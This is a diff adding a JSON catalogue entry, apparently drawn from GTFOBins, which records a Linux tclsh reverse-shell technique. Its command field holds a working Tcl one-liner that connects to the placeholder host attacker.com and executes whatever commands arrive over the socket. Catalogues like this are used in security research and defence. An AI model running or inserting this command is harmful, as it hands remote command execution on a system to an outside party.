@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-tclsh-reverse-shell",
+  "name": "GTFOBins · tclsh (reverse-shell)",
+  "command": "tclsh\nset s [socket attacker.com 12345];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",
+  "description": "Use tclsh to reverse shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "tclsh",
+    "reverse-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/tclsh/#reverse-shell",
+  "upstream_id": "tclsh/reverse-shell/0",
+  "category": "gtfobins",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/tclsh/"
+    }
+  ]
+}
